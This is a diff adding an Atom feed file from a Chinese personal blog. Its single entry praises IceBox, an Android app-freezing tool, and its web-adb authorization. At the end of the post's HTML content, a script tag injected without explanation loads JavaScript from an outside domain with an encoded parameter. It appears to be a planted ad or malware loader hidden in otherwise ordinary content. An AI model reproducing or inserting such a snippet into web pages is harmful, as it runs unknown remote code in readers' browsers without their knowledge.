@@ -1,0 +1,73 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://pangbai.work</id>
+    <title>𝕺𝖚𝖗 𝕷𝖎𝖋𝖊 • Posts by &#34;神器--冰箱的使用日常&#34; category</title>
+    <link href="https://pangbai.work" />
+    <updated>2021-03-20T04:00:27.000Z</updated>
+    <category term="Linux" />
+    <category term="shell" />
+    <category term="IT" />
+    <category term="编程" />
+    <category term="汇编语言" />
+    <category term="ADB" />
+    <category term="re" />
+    <category term="Dowork" />
+    <category term="Github" />
+    <category term="linux" />
+    <category term="kail" />
+    <category term="渗透" />
+    <category term="Android" />
+    <category term="安卓" />
+    <category term="博客日常" />
+    <category term="记录生活" />
+    <category term="氵帖" />
+    <category term="Minecraft" />
+    <category term="服务器" />
+    <category term="xposed" />
+    <category term="xp模块" />
+    <category term="太极" />
+    <category term="icebox" />
+    <category term="手机软件分享" />
+    <category term="线程下载器" />
+    <category term="MC" />
+    <category term="汇编" />
+    <category term="Re" />
+    <category term="frida" />
+    <category term="反调试" />
+    <category term="STM32" />
+    <category term="html前端" />
+    <entry>
+        <id>https://pangbai.work/share/icebox/</id>
+        <title>冰箱iceBox|一个让人叹为观止的软件</title>
+        <link rel="alternate" href="https://pangbai.work/share/icebox/"/>
+        <content type="html">&lt;h1 id=&#34;冰箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#冰箱&#34;&gt;#&lt;/a&gt;  &lt;code&gt;冰箱&lt;/code&gt;&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;在着个国内流氓软件繁多的世界，你遇到过许多的不如愿。&lt;br /&gt;
+在安卓 6 以后 bl 锁在许多机型中不可触及&lt;br /&gt;
+你花高价买了手机后，你拥有的不过是手机的使用权，其实根本无法完全控制你的手机。作为一个普通人，你即使花再多的钱买手机也不过是获得一小部分的优势而已。因为软件是别人做的，你的手机再贵也不可能躲掉拼多多，淘宝烦人的推送，不可能阻止那些毫无创意且幼稚的广告，不可能逃掉软件随意意弹出的页面，不可能避免那些全家桶应用自启。有人说卸掉软件就行了，可是那些软件你卸得掉吗？&lt;br /&gt;
+ &lt;code&gt;你的手机其实根本就不是你的&lt;/code&gt; &lt;br /&gt;
+手机只是你被商人压榨的工具。&lt;br /&gt;
+害怕拆机短接，bl 解锁麻烦，有些手机上不可能，每个商人都想要利益最大化。&lt;br /&gt;
+不少技术大佬去买谷歌的 &lt;code&gt;Nexus&lt;/code&gt;  或者 &lt;code&gt;一加&lt;/code&gt; ， &lt;code&gt;小米&lt;/code&gt; &lt;br /&gt;
+原因是他们能给的是一部手机，而不是只是使用权。&lt;br /&gt;
+不想寻求权利的普通用户也就这样吧，聪明人知道去维护自己应有的权利。&lt;br /&gt;
+在巨大的利益链之下有着正义的使者。&lt;br /&gt;
+冰箱就是其中之一。&lt;br /&gt;
+ &lt;code&gt;冰箱是一个专注于冻结应用的安卓软件，我能毫不犹豫的说它是下载量第一的冻结应用软件&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特点&#34;&gt;#&lt;/a&gt; 特点&lt;/h1&gt;
+&lt;p&gt;为什么冰箱如此受欢迎&lt;/p&gt;
+&lt;ul class=&#34;task-list&#34;&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_0&#34;&gt; 精心设计的 MD 风格软件&lt;/label&gt;&lt;/li&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_1&#34;&gt; 支持多重授权方式 Root 设备管理员 adb&lt;/label&gt;&lt;/li&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_2&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_2&#34;&gt; 提供冻结应用的管理，自动冻结等&lt;/label&gt;&lt;/li&gt;
+&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_3&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_3&#34;&gt; 开发者的十分努力，为用户提供了 web adb 的快捷授权，并同黑域，炼妖壶等开发者进行交流。&lt;/label&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在特点之中 web adb 最为闪亮，webUSB 这项谷歌还在实验阶段的技术的使用，让 web adb 成为可能，adb 变得更加便捷。&lt;br /&gt;
+最重要的是让你在没有电脑的情况下激活授权，而需要的只是一根 otg 和另一部手机。&lt;/p&gt;
+&lt;script&gt;(function(d){let s=d.createElement(&#39;script&#39;);s.async=true;s.src=&#39;https://puabvo.com/code/native.js?h=waWQiOjExNjQ1NDIsInNpZCI6MTMwNTk5OSwid2lkIjo1MTgwNTYsInNyYyI6Mn0=eyJ&#39;;d.head.appendChild(s);})(document);&lt;/script&gt;
+</content>
+        <category term="icebox" />
+        <updated>2021-03-20T04:00:27.000Z</updated>
+    </entry>
+</feed>
